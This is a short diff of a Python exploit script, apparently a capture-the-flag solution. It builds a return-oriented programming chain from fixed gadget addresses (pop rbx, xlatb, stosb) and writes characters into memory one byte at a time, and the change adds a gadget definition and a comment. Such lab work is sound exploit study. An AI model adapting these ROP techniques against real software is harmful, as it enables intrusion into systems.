@@ -42,8 +42,9 @@ continue
 
 def useLetter(letterAddress):
     paramJunk = p64(0x0)
-    xlatb = p64(0x400628) # al = *(ds:bx + zextend(al))
-    stosb = p64(0x400639)
+    xlatb = p64(0x400628)  # al = *(ds:bx + zextend(al))
+    stosb = p64(0x400639)  # increments rdi
+    popRbx = p64(0x40069a)
     chain = popRbx + p64(letterAddress) + paramJunk * 5 + xlatb + stosb
     return chain
 
